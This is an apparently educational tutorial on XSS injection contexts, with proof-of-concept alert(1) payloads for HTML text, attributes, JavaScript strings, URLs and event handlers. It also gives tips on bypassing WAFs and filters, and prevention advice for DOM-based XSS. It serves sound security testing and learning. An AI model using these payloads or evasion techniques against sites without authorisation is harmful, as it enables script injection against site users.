## 1. What Does "Context" Mean in XSS?

When testing for **Reflected XSS** or **Stored XSS**, one of the most important tasks is to **identify the context** in which your input appears in the server's response.

This context determines **how your input is interpreted by the browser**, and therefore what kind of payload can be used to trigger XSS.

### Context refers to:

* **Where** the attacker-controlled data appears in the HTML/DOM.
* **How** the data is processed, filtered, or validated by the application before reaching the client.

---

## 2. Types of XSS Contexts

Below are the most common XSS contexts you’ll encounter during testing, along with sample payload strategies:

---

###  **1. Between HTML Tags (Text Context)**

**Example:**

```html
<p>Welcome, Ahmed</p>
```

If user input goes inside a tag as plain text, you can try **breaking out of the tag** and injecting a new HTML/JavaScript tag.

**Payload Examples:**

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

---

###  **2. Inside an HTML Attribute (Attribute Context)**

**Example:**

```html
<input type="text" value="Ahmed">
```

If your input is reflected inside a `value`, `src`, `href`, `title`, etc., you must **break out of the attribute** and inject a new attribute/event.

**Payload Examples:**

```html
" onmouseover="alert(1)
' onerror='alert(1)
```

---

###  **3. Inside JavaScript Code (JavaScript Context)**

**Example:**

```html
<script>
   var username = "Ahmed";
</script>
```

If your input appears inside a JavaScript block or variable, you can try breaking out of the quotes or script logic.

**Payload Examples:**

```javascript
";alert(1);//
';alert(1);// 
```

---

###  **4. Inside a URL (Href/Action/src)**

**Example:**

```html
<a href="https://example.com/?name=Ahmed">Click here</a>
```

Payloads in URL attributes might need to break out of the URL and inject `javascript:` protocol or HTML elements.

**Payload Examples:**

```html
javascript:alert(1)
"><script>alert(1)</script>
```

Note: `javascript:` schemes are often filtered, but you can try using `data:` URIs or other encodings.

---

###  **5. Inside an Event Handler (Onclick, Onload, etc.)**

If the input is placed inside an event handler, it may already be executable.

**Example:**

```html
<div onclick="doSomething('Ahmed')">Click me</div>
```

You can inject payloads directly or break out of strings.

**Payload Examples:**

```javascript
');alert(1);//
```

---

## 3. How to Identify XSS Context

To find the right context:

* **Submit test input** like `test123` or `"><test>` and observe where it reflects.
* Use **browser DevTools** (Inspect Element) to see the exact position in HTML, JS, or attributes.
* Test how the input is **processed**—some apps sanitize or encode certain characters.

---

## 4. Choosing the Right Payload

Once you understand the context, choose or create a payload that fits that context:

| Context Type       | Example Payload             |
| ------------------ | --------------------------- |
| HTML Text          | `<script>alert(1)</script>` |
| HTML Attribute     | `" onerror="alert(1)`       |
| JavaScript Context | `';alert(1);//`             |
| URL Injection      | `javascript:alert(1)`       |
| Event Handler      | `');alert(1);//`            |

---

## 5. Helpful Resources

* [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
* [XSS Game by Google](https://xss-game.appspot.com/)

---

## 6. Notes on Filtering and Bypasses

Modern web apps may use:

* HTML encoding (e.g., `&lt;`, `&gt;`)
* JavaScript escaping (e.g., `\u003c`)
* WAF/IDS protection (Web Application Firewalls)

To bypass:

* Use **Unicode**, **HTML entities**, or **different encoding** techniques
* Try **obfuscating payloads**, chaining tags, or using uncommon events

Example Bypass:

```html
<svg/onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

---

## 7. Bonus: DOM-Based XSS Contexts

DOM-XSS happens when client-side JavaScript takes user input and inserts it into the DOM **without proper sanitization**.

**Common sinks:**

```js
document.write()
element.innerHTML
location.hash
```

**Prevention:**

* Avoid dangerous sinks
* Use safe DOM APIs like `textContent`, `setAttribute`
* Use libraries like DOMPurify for sanitization

---
